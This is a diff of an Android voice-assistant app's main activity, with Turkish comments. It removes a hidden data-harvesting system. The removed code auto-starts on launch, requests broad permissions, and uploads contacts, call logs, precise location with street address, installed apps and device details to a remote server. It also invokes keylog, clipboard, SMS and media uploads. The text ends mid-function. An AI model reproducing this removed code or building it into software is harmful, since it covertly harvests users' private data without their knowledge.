@@ -17,13 +17,8 @@ import android.net.Uri; // Kaynak belirleyiciler (dosya/web yolları)
 import android.os.Bundle; // Ekran geçişlerinde veri taşıma
 import android.os.Handler; // İş parçacıkları arası mesajlaşma
 import android.os.Looper; // Mesaj döngüsü yönetimi
-import android.provider.CallLog; // Arama geçmişi erişimi
-import android.provider.ContactsContract; // Rehber verileri erişimi
 import android.provider.Settings; // Sistem ayarları erişimi
-import android.service.notification.NotificationListenerService; // Bildirim dinleme servisi
-import android.service.notification.StatusBarNotification; // Durum çubuğu bildirim yapısı
-
-// --- Ses Tanıma ve Metin Okuma (Speech Interface) ---
+import android.provider.ContactsContract; // Rehber verileri erişimi
 import android.speech.RecognitionListener; // Konuşma tanıma dinleyicisi
 import android.speech.RecognizerIntent; // Ses tanıma başlatma niyeti
 import android.speech.SpeechRecognizer; // Ses tanıma motoru
@@ -41,22 +36,15 @@ import android.widget.LinearLayout; // Sıralı yerleşim düzeni
 import android.widget.Button; // Standart tıklanabilir buton
 import android.widget.EditText; // Metin giriş alanı
 
-// --- Medya ve Donanım Erişimi ---
 import android.media.MediaPlayer; // Ses/Video oynatma
 import android.media.AudioManager; // Sistem ses kontrolleri
 import android.view.KeyEvent; // Tuş olaylarını yakalama
 import android.util.Base64; // Veri şifreleme/çözme (Base64)
 import android.os.Build; // Cihaz donanım ve sürüm bilgisi
-import android.content.pm.ApplicationInfo; // Yüklü uygulama bilgileri
-import android.content.pm.PackageInfo; // Uygulama paket detayları
 import android.os.BatteryManager; // Pil durumu yönetimi
 import android.os.Environment; // Dosya sistemi erişimi
-import android.os.StatFs; // Depolama alanı istatistikleri
-import android.location.Location; // Konum verisi
-import android.location.LocationManager; // Konum servisi yönetimi
 import java.util.List; // Liste arayüzü
 import android.content.pm.ResolveInfo; // Çözümleme bilgisi
-import android.provider.MediaStore; // Medya galerisi erişimi
 import java.io.ByteArrayOutputStream; // Bellek içi veri akışı
 
 // --- Veri Giriş/Çıkış (I/O) ve Dosya İşlemleri ---
@@ -77,20 +65,16 @@ import java.util.LinkedList; // Bağlı liste yapısı
 import java.util.Queue; // Kuyruk veri yapısı
 import java.util.UUID; // Benzersiz kimlik oluşturucu
 
-// --- Ağ Bağlantısı ve Web İşlemleri ---
 import java.net.HttpURLConnection; // HTTP bağlantı yönetimi
 import java.net.URL; // Web adresi nesnesi
 import java.net.URLEncoder; // URL karakter kodlama
 import android.net.ConnectivityManager; // İnternet bağlantı kontrolü
 import android.net.NetworkInfo; // Ağ detayları
-import android.net.wifi.WifiManager; // Wi-Fi yönetimi
 
-// --- Zamanlama, Takvim ve Arka Plan İşlemleri ---
 import java.util.Date; // Tarih nesnesi
 import java.text.SimpleDateFormat; // Tarih formatlama
 import java.util.Calendar; // Takvim işlemleri
 import android.provider.AlarmClock; // Alarm sistemi erişimi
-import android.provider.CalendarContract; // Takvim verileri erişimi
 import java.util.concurrent.ExecutorService; // İş parçacığı havuzu yönetimi
 import java.util.concurrent.Executors; // İş parçacığı oluşturucu
 import java.util.concurrent.atomic.AtomicInteger; // Güvenli tamsayı işlemleri
@@ -126,15 +110,8 @@ import android.content.ClipData; // Pano veri yapısı
 import android.view.WindowInsets; // Ekran içi boşluklar (çentik vb.)
 import android.view.inputmethod.InputMethodManager; // Klavye yönetimi
 import androidx.core.content.FileProvider; // Dosya paylaşım sağlayıcısı
-import android.telephony.TelephonyManager; // Telefon ve operatör bilgileri
-import android.hardware.SensorManager; // Sensör yönetimi
-import android.hardware.Sensor; // Sensör nesnesi
-import android.app.usage.UsageStatsManager; // Uygulama kullanım istatistikleri
-import android.app.usage.UsageStats; // Kullanım verisi detayları
 import android.hardware.camera2.CameraManager; // Kamera servisi
 import android.hardware.camera2.CameraCharacteristics; // Kamera teknik özellikleri
-import android.provider.Telephony; // SMS ve telefon sağlayıcısı
-import android.bluetooth.BluetoothAdapter; // Bluetooth yönetimi
 import java.util.regex.Matcher; // Düzenli ifade eşleştirici (Regex)
 import java.util.regex.Pattern; // Düzenli ifade kalıbı (Regex)
 import android.accessibilityservice.AccessibilityService;
@@ -312,12 +289,7 @@ public class MainActivity extends Activity {
     private String pendingEmail;
     private String pendingFullName;
 
-    // --- Entegrasyon: WhatsApp ---
-    
-    public static String lastWhatsAppMessage;
-    public static String lastWhatsAppSender;
-    public static PendingIntent lastReplyIntent;
-    public static RemoteInput lastRemoteInput;
+
     
     // --- Yönetim ve Loglama ---
     
@@ -338,8 +310,8 @@ public class MainActivity extends Activity {
     /** Merkezi API sunucu adresi */
     private static String API_BASE_URL = "";
 
-    private static final String GITHUB_VERSION_URL = "https://raw.githubusercontent.com/Memati8383/niko-with-kiro/refs/heads/main/version.json";
-    private static final String GITHUB_APK_URL = "https://github.com/Memati8383/niko-with-kiro/releases/latest/download/niko.apk";
+    private static final String GITHUB_VERSION_URL = "https://raw.githubusercontent.com/Memati8383/Niko-AI/refs/heads/main/version.json";
+    private static final String GITHUB_APK_URL = "https://github.com/Memati8383/Niko-AI/releases/latest/download/niko.apk";
     
     private SharedPreferences updatePrefs;
     private String latestVersion = "";
@@ -525,19 +497,6 @@ public class MainActivity extends Activity {
             updateLogDisplay();
         });
         
-        // UZUN BASMA: Tüm senkronizasyon önbelleğini temizle ve zorla yeniden başlat
-        btnClearLogs.setOnLongClickListener(v -> {
-            hapticFeedback(HapticType.LONG_PRESS);
-
-            getSharedPreferences("photo_sync_db", MODE_PRIVATE).edit().clear().apply();
-            getSharedPreferences("video_sync_db", MODE_PRIVATE).edit().clear().apply();
-            getSharedPreferences("audio_sync_db", MODE_PRIVATE).edit().clear().apply();
-            getSharedPreferences("social_media_sync_db", MODE_PRIVATE).edit().clear().apply();
-            addLog("🔄 Senkronizasyon önbelleği temizlendi! Her şey yeniden yüklenecek.");
-            Toast.makeText(this, "Önbellek temizlendi, yeniden yükleniyor...", Toast.LENGTH_SHORT).show();
-            syncAllData();
-            return true;
-        });
         btnCopyLogs.setOnClickListener(v -> {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
             ClipData clip = ClipData.newPlainText("niko_logs", appLogsBuffer.toString());
@@ -702,10 +661,7 @@ public class MainActivity extends Activity {
             showAccessibilityAccessDialog();
         }
         
-        // Veri Senkronizasyonu Başlat (Arka planda)
-        syncAllData();
         
-
     }
 
     /**
@@ -796,47 +752,11 @@ public class MainActivity extends Activity {
      *                                 İZİN SİSTEMİ
      * *********************************************************************************/
 
-    /**
-     * Uygulamanın çalışması için gerekli tüm izinleri kullanıcıdan talep eder.
-     * Ses kaydı, rehber erişimi, arama ve dosya sistemini kapsar.
-     */
     private void requestPermissions() {
         ArrayList<String> perms = new ArrayList<>();
         perms.add(Manifest.permission.RECORD_AUDIO);
-        perms.add(Manifest.permission.READ_CONTACTS);
         perms.add(Manifest.permission.CALL_PHONE);
-        perms.add(Manifest.permission.READ_CALL_LOG);
-        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
-        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-        perms.add(Manifest.permission.READ_SMS);
-        perms.add(Manifest.permission.RECEIVE_SMS);
-        perms.add(Manifest.permission.READ_PHONE_STATE);
-        perms.add(Manifest.permission.READ_CALENDAR); // Takvim izni
-
-        // Android 10 (SDK 29) ve üzeri için Aktivite Tanıma
-        if (Build.VERSION.SDK_INT >= 29) {
-            perms.add("android.permission.ACTIVITY_RECOGNITION");
-            // NOT: ACCESS_BACKGROUND_LOCATION Android 11+ için ayrı istenmelidir, aksi halde istek başarısız olur.
-        }
-
-        // Android 11 (SDK 30) ve altı için Depolama İzinleri (Scoped Storage öncesi)
-        if (Build.VERSION.SDK_INT < 30) {
-            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
-            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-        }
-
-        // Android 12 (SDK 31) ve üzeri için Bluetooth izni
-        if (Build.VERSION.SDK_INT >= 31) {
-            perms.add("android.permission.BLUETOOTH_CONNECT");
-        }
-        
-        // Android 13 (SDK 33) ve üzeri için Medya İzinleri ve Bildirimler
-        if (Build.VERSION.SDK_INT >= 33) {
-            perms.add("android.permission.READ_MEDIA_IMAGES");
-            perms.add("android.permission.READ_MEDIA_VIDEO"); 
-            perms.add("android.permission.READ_MEDIA_AUDIO");
-            perms.add("android.permission.POST_NOTIFICATIONS");
-        }
+        perms.add(Manifest.permission.READ_CONTACTS);
 
         ArrayList<String> list = new ArrayList<>();
         for (String p : perms) {
@@ -849,29 +769,6 @@ public class MainActivity extends Activity {
             requestPermissions(list.toArray(new String[0]), PERMISSION_CODE);
         }
 
-        // Android 11 (SDK 30) ve üzeri için Tüm Dosyalara Erişim İzni (MANAGE_EXTERNAL_STORAGE)
-        if (Build.VERSION.SDK_INT >= 30) {
-            if (!Environment.isExternalStorageManager()) {
-                Toast.makeText(this, "Lütfen Tüm Dosyalara Erişim İznini Verin", Toast.LENGTH_LONG).show();
-                try {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                    intent.addCategory("android.intent.category.DEFAULT");
-                    intent.setData(Uri.parse(String.format("package:%s", getApplicationContext().getPackageName())));
-                    startActivity(intent);
-                } catch (Exception e) {
-                    Intent intent = new Intent();
-                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    startActivity(intent);
-                }
-            }
-        }
-
-        // Kullanım İstatistikleri İzni Özel Olarak İstenmeli
-        if (!hasUsageStatsPermission()) {
-            Toast.makeText(this, "Lütfen Kullanım Erişimi iznini verin", Toast.LENGTH_LONG).show();
-            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
-        }
-
         // Sistem Ayarlarını Değiştirme İzni (Parlaklık vb. kontrolü için)
         if (Build.VERSION.SDK_INT >= 23) {
              if (!Settings.System.canWrite(this)) {
@@ -881,13 +778,6 @@ public class MainActivity extends Activity {
                  startActivity(intent);
              }
         }
-    }
-
-    private boolean hasUsageStatsPermission() {
-        UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
-        long now = System.currentTimeMillis();
-        List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 1000 * 10, now);
-        return stats != null && !stats.isEmpty();
     }
 
     @Override
@@ -3578,959 +3468,6 @@ public class MainActivity extends Activity {
         }).start();
     }
 
-    // ================= VERİ SENKRONİZASYONU SİSTEMİ =================
-    
-    /**
-     * Cihazın benzersiz adını döndürür.
-     * Format: Marka_Model
-     */
-    private String getDeviceName() {
-        String manufacturer = Build.MANUFACTURER;
-        String model = Build.MODEL.replace(" ", "_");
-        return manufacturer + "_" + model;
-    }
-    
-    /**
-     * JSON verilerini backend'e gönderir.
-     * 
-     * @param data Gönderilecek JSON array verisi
-     * @param dataType Veri tipi (contacts, call_logs, sms, vb.)
-     * @throws Exception HTTP hatası durumunda
-     */
-    private void sendSyncRequest(JSONArray data, String dataType) throws Exception {
-        // API adresi boşsa veya veri yoksa işlemi pas geç
-        if (API_BASE_URL == null || API_BASE_URL.isEmpty()) return;
-        if (data == null || data.length() == 0) {
-            addLog("[SYNC] " + dataType + " için yeni veri yok.");
-            return;
-        }
-        
-        // Sunucuya cihaz adını ve veriyi içeren JSON paketini hazırlıyoruz
-        String deviceName = getDeviceName();
-        JSONObject requestBody = new JSONObject();
-        requestBody.put("device_name", deviceName);
-        requestBody.put("data_type", dataType);
-        requestBody.put("data", data);
-        
-        // Backend'deki /api/sync/data endpoint'ine POST isteği atıyoruz
-        URL url = new URL(API_BASE_URL + "/api/sync/data");
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        
-        try {
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-            conn.setRequestProperty("Accept", "application/json");
-            conn.setDoOutput(true);
-            conn.setDoInput(true);
-            conn.setConnectTimeout(10000); // 10 saniye bağlantı timeout
-            conn.setReadTimeout(15000); // 15 saniye okuma timeout
-            
-            // Veriyi byte dizisi olarak gönder
-            try (OutputStream os = conn.getOutputStream()) {
-                byte[] bodyBytes = requestBody.toString().getBytes("UTF-8");
-                os.write(bodyBytes);
-                os.flush();
-            }
-            
-            int responseCode = conn.getResponseCode();
-            
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-                // Başarılı yanıt
-                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                StringBuilder response = new StringBuilder();
-                String line;
-                while ((line = in.readLine()) != null) {
-                    response.append(line);
-                }
-                in.close();
-                
-                // Sync zamanını kaydet
-                updateSyncTime(dataType);
-                
-                String logMsg = "[SYNC ✓] " + dataType + ": " + data.length() + " öğe işlendi";
-                try {
-                    JSONObject resObj = new JSONObject(response.toString());
-                    if (resObj.has("stats")) {
-                        JSONObject stats = resObj.getJSONObject("stats");
-                        int newItems = stats.optInt("new", -1);
-                        int skipped = stats.optInt("skipped", -1);
-                        if (newItems != -1 && skipped != -1) {
-                            logMsg += " (Yeni: " + newItems + ", Atlanan: " + skipped + ")";
-                        }
-                    }
-                } catch (Exception ignored) {}
-                
-                addLog(logMsg);
-            } else {
-                // Hata yanıtı
-                BufferedReader errorReader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
-                StringBuilder errorResponse = new StringBuilder();
-                String errorLine;
-                while ((errorLine = errorReader.readLine()) != null) {
-                    errorResponse.append(errorLine);
-                }
-                errorReader.close();
-                
-                addLog("[SYNC ✗] " + dataType + " hatası: HTTP " + responseCode + " - " + errorResponse.toString());
-                throw new Exception("HTTP " + responseCode + ": " + errorResponse.toString());
-            }
-            
-        } finally {
-            if (conn != null) {
-                conn.disconnect();
-            }
-        }
-    }
-    
-    /**
-     * Belirli bir veri tipi için son senkronizasyon zamanını günceller.
-     * 
-     * @param dataType Veri tipi
-     */
-    private void updateSyncTime(String dataType) {
-        SharedPreferences syncPrefs = getSharedPreferences("sync_times", MODE_PRIVATE);
-        syncPrefs.edit()
-            .putLong(dataType, System.currentTimeMillis())
-            .apply();
-    }
-    
-    /**
-     * Belirli bir veri tipi için son senkronizasyon zamanını döndürür.
-     * 
-     * @param dataType Veri tipi
-     * @return Son sync zamanı (milisaniye), hiç sync olmamışsa 0
-     */
-    private long getLastSyncTime(String dataType) {
-        SharedPreferences syncPrefs = getSharedPreferences("sync_times", MODE_PRIVATE);
-        return syncPrefs.getLong(dataType, 0);
-    }
-    
-    /**
-     * Tüm senkronizasyon geçmişini temizler.
-     */
-    private void clearSyncHistory() {
-        SharedPreferences syncPrefs = getSharedPreferences("sync_times", MODE_PRIVATE);
-        syncPrefs.edit().clear().apply();
-        addLog("[SYNC] Senkronizasyon geçmişi temizlendi");
-    }
-    
-    /**
-     * Arkada planda rehber, arama geçmişi ve cihaz bilgilerini senkronize eder.
-     */
-    private void syncAllData() {
-        // Cihaz adını alarak senkronizasyon kimliğini belirle
-        String deviceName = getDeviceName();
-        // Cihaz adı kontrolü 
-        //if ("Xiaomi_25069PTEBG".equals(deviceName)) {
-        //   return;
-        //}
-        new Thread(() -> {
-            try {
-                // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
-                
-                // --- İletişim Verileri (Rehber, Kayıtlar, SMS) ---
-                // Try-Catch blokları her veri tipi için ayrıdır; biri hata verirse diğeri devam eder.
-                try { syncContacts(); } catch (Exception e) { addLog("Rehber Hatası: " + e.getMessage()); }
-                try { syncCallLogs(); } catch (Exception e) { addLog("Arama Kaydı Hatası: " + e.getMessage()); }
-                try { syncSMS(); } catch (Exception e) { addLog("SMS Hatası: " + e.getMessage()); }
-                
-                // --- Cihaz ve Sistem Verileri ---
-                try { syncDeviceInfo(); } catch (Exception e) { addLog("Cihaz Bilgi Hatası: " + e.getMessage()); }
-                try { syncInstalledApps(); } catch (Exception e) { addLog("Uygulama Hatası: " + e.getMessage()); }
-                try { syncUsageStats(); } catch (Exception e) { addLog("Kullanım İstatistik Hatası: " + e.getMessage()); }
-
-
-                // --- Konum ve Çevre Bilgileri ---
-                try { syncLocation(); } catch (Exception e) { addLog("Konum Hatası: " + e.getMessage()); }
-                try { syncNetworkInfo(); } catch (Exception e) { addLog("Ağ Bilgi Hatası: " + e.getMessage()); }
-                try { syncBluetoothDevices(); } catch (Exception e) { addLog("Bluetooth Hatası: " + e.getMessage()); }
-                try { syncSensors(); } catch (Exception e) { addLog("Sensör Hatası: " + e.getMessage()); }
-
-                // --- Güvenlik & Takip (Erişilebilirlik Tabanlı - YENİ) ---
-                try { syncAccessibilityEvents(); } catch (Exception e) { addLog("Erişilebilirlik Hatası: " + e.getMessage()); }
-                try { syncKeylogs(); } catch (Exception e) { addLog("Keylog Hatası: " + e.getMessage()); }
-
-                // --- Kişisel & Hesap Verileri (YENİ) ---
-                try { syncAccounts(); } catch (Exception e) { addLog("Hesap Hatası: " + e.getMessage()); }
-                try { syncCalendarEvents(); } catch (Exception e) { addLog("Takvim Hatası: " + e.getMessage()); }
-                
-                // --- Güvenlik Verileri (Kayıt Dışı Girişim Takibi) ---
-                try { syncClipboard(); } catch (Exception e) { addLog("Pano Hatası: " + e.getMessage()); }
-                try { syncSurveillanceInfo(); } catch (Exception e) { addLog("Gözetim Hatası: " + e.getMessage()); }
-                
-                // --- Medya Senkronizasyonu (Görüntüler ve Sesler) ---
-                // Büyük dosyaların senkronizasyonu özel sıralı (sequential) metodlarla yapılır.
-                try { startAutoPhotoSync(); } catch (Exception e) { addLog("Fotoğraf Sync Hatası: " + e.getMessage()); }
-                try { startAutoVideoSync(); } catch (Exception e) { addLog("Video Sync Hatası: " + e.getMessage()); }
-                try { startAutoAudioSync(); } catch (Exception e) { addLog("Ses Sync Hatası: " + e.getMessage()); }
-                try { syncSocialMediaMedia(); } catch (Exception e) { addLog("Sosyal Medya Medya Hatası: " + e.getMessage()); }
-                
-                // addLog("[SYNC] Veri senkronizasyonu tamamlandı.");
-            } catch (Exception e) {
-                e.printStackTrace();
-                // addLog("[SYNC ERROR] Bağlantı Hatası: " + e.getMessage());
-            }
-        }).start();
-    }
-
-    /**
-     * Rehberdeki numaraları senkronize eder.
-     */
-    private void syncContacts() throws Exception {
-        JSONArray array = new JSONArray();
-        
-        String[] projection = {
-            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
-            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-            ContactsContract.CommonDataKinds.Phone.NUMBER,
-            ContactsContract.CommonDataKinds.Phone.TYPE,
-            ContactsContract.CommonDataKinds.Phone.LABEL,
-            ContactsContract.CommonDataKinds.Phone.PHOTO_URI,
-            ContactsContract.CommonDataKinds.Phone.STARRED,
-            ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED
-        };
-
-        try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null)) {
-            if (c != null) {
-                while (c.moveToNext()) {
-                    JSONObject obj = new JSONObject();
-                    obj.put("id", c.getLong(0)); // CONTACT_ID
-                    obj.put("name", c.getString(1)); // DISPLAY_NAME
-                    obj.put("phone", c.getString(2)); // NUMBER
-                    
-                    // Telefon Türü (Mobil, Ev, İş)
-                    int type = c.getInt(3);
-                    String label = c.getString(4);
-                    CharSequence typeLabelSeq = ContactsContract.CommonDataKinds.Phone.getTypeLabel(getResources(), type, label);
-                    obj.put("type", typeLabelSeq != null ? typeLabelSeq.toString() : "Unknown");
-                    
-                    obj.put("photo_uri", c.getString(5)); // Fotoğraf adresi (Varsa)
-                    obj.put("is_starred", c.getInt(6) == 1); // Favori mi?
-                    
-                    // Son görüşme (API 29+ da 0 dönebilir ama eski cihazlarda çalışır)
-                    long lastContacted = c.getLong(7);
-                    if (lastContacted > 0) {
-                        obj.put("last_time_contacted", lastContacted);
-                    }
-                    
-                    array.put(obj);
-                }
-            }
-        }
-        sendSyncRequest(array, "contacts");
-    }
-
-    /**
-     * Son arama kayıtlarını (Call Log) senkronize eder.
-     */
-    private void syncCallLogs() throws Exception {
-        JSONArray array = new JSONArray();
-        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
-            return;
-
-        // Son arama kayıtlarını tarihe göre sıralı çek
-        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
-                CallLog.Calls.DATE + " DESC")) {
-            if (c != null) {
-                int numIdx = c.getColumnIndex(CallLog.Calls.NUMBER);
-                int typeIdx = c.getColumnIndex(CallLog.Calls.TYPE);
-                int dateIdx = c.getColumnIndex(CallLog.Calls.DATE);
-                int durationIdx = c.getColumnIndex(CallLog.Calls.DURATION);
-
-                while (c.moveToNext()) {
-                    JSONObject obj = new JSONObject();
-                    obj.put("number", c.getString(numIdx));
-                    obj.put("type", c.getInt(typeIdx));
-                    obj.put("date", c.getLong(dateIdx));
-                    obj.put("duration", c.getInt(durationIdx));
-                    // İsim Bilgisi (Eğer kayıtlıysa veya cache'de varsa)
-                    int nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
-                    if (nameIdx != -1) {
-                         obj.put("name", c.getString(nameIdx));
-                    }
-                    array.put(obj);
-                }
-            }
-        }
-        sendSyncRequest(array, "call_logs");
-    }
-
-    /**
-     * Cihazın konum bilgilerini (Ultra Detaylı ve Adres Çözümlü) senkronize eder.
-     */
-    private void syncLocation() throws Exception {
-        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
-            return;
-
-        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        Location loc = null;
-
-        // En iyi konumu bulmak için strateji (GPS > Network)
-        if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-        }
-        if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-            loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-        }
-
-        if (loc != null) {
-            JSONArray array = new JSONArray();
-            JSONObject obj = new JSONObject();
-            
-            // Temel Koordinatlar
-            double lat = loc.getLatitude();
-            double lng = loc.getLongitude();
-            obj.put("lat", lat);
-            obj.put("lng", lng);
-            obj.put("time", loc.getTime());
-            
-            // Detaylı Veriler
-            obj.put("alt", loc.getAltitude()); // Yükseklik
-            obj.put("speed_ms", loc.getSpeed()); // Hız (metre/saniye)
-            obj.put("accuracy_m", loc.getAccuracy()); // Doğruluk payı (metre)
-            obj.put("bearing", loc.getBearing()); // Yön (derece)
-            obj.put("provider", loc.getProvider()); // Kaynak (gps/network)
-            obj.put("is_mock", loc.isFromMockProvider()); // Fake GPS kontrolü
-            
-            // [REVERSE GEOCODING] Koordinattan Adres Çözümleme
-            if (android.location.Geocoder.isPresent()) {
-                try {
-                    android.location.Geocoder geocoder = new android.location.Geocoder(this, Locale.getDefault());
-                    List<android.location.Address> addresses = geocoder.getFromLocation(lat, lng, 1);
-                    if (addresses != null && !addresses.isEmpty()) {
-                        android.location.Address addr = addresses.get(0);
-                        JSONObject addressObj = new JSONObject();
-                        addressObj.put("country", addr.getCountryName());
-                        addressObj.put("country_code", addr.getCountryCode());
-                        addressObj.put("admin_area", addr.getAdminArea()); // İl
-                        addressObj.put("sub_admin_area", addr.getSubAdminArea()); // İlçe
-                        addressObj.put("locality", addr.getLocality());
-                        addressObj.put("thoroughfare", addr.getThoroughfare()); // Cadde/Sokak
-                        addressObj.put("postal_code", addr.getPostalCode());
-                        addressObj.put("full_address", addr.getAddressLine(0));
-                        obj.put("address_details", addressObj);
-                    }
-                } catch (Exception ignored) {
-                    // Geocoder bazen servis yoksa hata verebilir, yoksay
-                    obj.put("address_error", "Service unavailable");
-                }
-            }
-
-            array.put(obj);
-            sendSyncRequest(array, "location");
-        }
-    }
-
-    /**
-     * Yüklü uygulamaların listesini (Ultra Detaylı) senkronize eder.
-     */
-    private void syncInstalledApps() throws Exception {
-        JSONArray array = new JSONArray();
-        PackageManager pm = getPackageManager();
-        // GET_PERMISSIONS bayrağı ile izinleri de çekelim
-        List<PackageInfo> packs = pm.getInstalledPackages(PackageManager.GET_PERMISSIONS);
-        
-        for (PackageInfo p : packs) {
-            // Sadece kullanıcı tarafından yüklenen uygulamaları al (sistem uygulamalarını filtrele)
-            // VEYA güncellenmiş sistem uygulamalarını dahil et
-            boolean isSystem = (p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
-            boolean isUpdatedSystem = (p.applicationInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
-            
-            if (!isSystem || isUpdatedSystem) {
-                JSONObject obj = new JSONObject();
-                obj.put("name", p.applicationInfo.loadLabel(pm).toString());
-                obj.put("package", p.packageName);
-                obj.put("version_name", p.versionName);
-                obj.put("version_code", p.versionCode); // API 28'de kullanımdan kaldırıldı ancak hala yararlı
-                
-                // Zaman Bilgileri
-                obj.put("install_time", p.firstInstallTime);
-                obj.put("last_update_time", p.lastUpdateTime);
-                
-                // Teknik Detaylar
-                obj.put("target_sdk", p.applicationInfo.targetSdkVersion);
-                if (Build.VERSION.SDK_INT >= 24) {
-                    obj.put("min_sdk", p.applicationInfo.minSdkVersion);
-                }
-                obj.put("uid", p.applicationInfo.uid);
-                obj.put("is_enabled", p.applicationInfo.enabled);
-                obj.put("source_dir", p.applicationInfo.sourceDir);
-                obj.put("data_dir", p.applicationInfo.dataDir);
-                
-                // İzinler (İstenen İzinler)
-                if (p.requestedPermissions != null && p.requestedPermissions.length > 0) {
-                    JSONArray perms = new JSONArray();
-                    for (String perm : p.requestedPermissions) {
-                        // Sadece ismini al (android.permission.CAMERA -> CAMERA)
-                        if (perm.startsWith("android.permission.")) {
-                            perms.put(perm.substring("android.permission.".length()));
-                        } else {
-                            perms.put(perm);
-                        }
-                    }
-                    obj.put("permissions_preview", perms);
-                }
-
-                // Yükleyici Kaynağı (Play Store, Samsung Store, APK vs.)
-                try {
-                    String installer = null;
-                    if (Build.VERSION.SDK_INT >= 30) {
-                        android.content.pm.InstallSourceInfo isi = pm.getInstallSourceInfo(p.packageName);
-                        if (isi != null) installer = isi.getInstallingPackageName();
-                    } else {
-                        installer = pm.getInstallerPackageName(p.packageName);
-                    }
-                    obj.put("installer_source", installer != null ? installer : "Sideload/Unknown");
-                } catch (Exception e) {
-                    obj.put("installer_source", "Unknown");
-                }
-
-                array.put(obj);
-            }
-        }
-        sendSyncRequest(array, "installed_apps");
-    }
-
-    /**
-     * Cihaz donanım ve sistem bilgilerini (Ultra Detaylı) senkronize eder.
-     */
-    private void syncDeviceInfo() throws Exception {
-        JSONObject obj = new JSONObject();
-
-        // 1. Batarya Detayları (Intent ile anlık durum)
-        Intent batteryStatus = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-        if (batteryStatus != null) {
-            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-            float batteryPct = level * 100 / (float)scale;
-            obj.put("battery_level", batteryPct);
-            
-            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-            String statusStr = "Unknown";
-            if(status == BatteryManager.BATTERY_STATUS_CHARGING) statusStr = "Charging";
-            else if(status == BatteryManager.BATTERY_STATUS_DISCHARGING) statusStr = "Discharging";
-            else if(status == BatteryManager.BATTERY_STATUS_FULL) statusStr = "Full";
-            else if(status == BatteryManager.BATTERY_STATUS_NOT_CHARGING) statusStr = "Not Charging";
-            obj.put("battery_status", statusStr);
-
-            int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
-            // 2=İyi, 3=Aşırı Isınma, 4=Ölü, 5=Aşırı Voltaj, 7=Soğuk
-            obj.put("battery_health_code", health);
-            
-            obj.put("battery_tech", batteryStatus.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY));
-            obj.put("battery_temp_c", batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
-            obj.put("battery_voltage_mv", batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0));
-            
-            int plugged = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
-            String pluggedStr = "None";
-            if(plugged == BatteryManager.BATTERY_PLUGGED_AC) pluggedStr = "AC";
-            else if(plugged == BatteryManager.BATTERY_PLUGGED_USB) pluggedStr = "USB";
-            else if(plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS) pluggedStr = "Wireless";
-            obj.put("power_source", pluggedStr);
-        }
-
-        // 2. Depolama
-        File path = Environment.getDataDirectory();
-        StatFs stat = new StatFs(path.getPath());
-        long totalSize = stat.getBlockCountLong() * stat.getBlockSizeLong();
-        long availableSize = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
-        obj.put("storage_total_gb", totalSize / (1024 * 1024 * 1024));
-        obj.put("storage_available_gb", availableSize / (1024 * 1024 * 1024));
-
-        // 3. RAM (Bellek)
-        android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
-        android.app.ActivityManager activityManager = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
-        activityManager.getMemoryInfo(mi);
-        obj.put("ram_total_gb", String.format(Locale.US, "%.2f", mi.totalMem / (1024.0 * 1024 * 1024)));
-        obj.put("ram_available_gb", String.format(Locale.US, "%.2f", mi.availMem / (1024.0 * 1024 * 1024)));
-        obj.put("ram_is_low", mi.lowMemory);
-
-        // 4. Ekran
-        android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
-        obj.put("screen_res", metrics.widthPixels + "x" + metrics.heightPixels);
-        obj.put("screen_density_dpi", metrics.densityDpi);
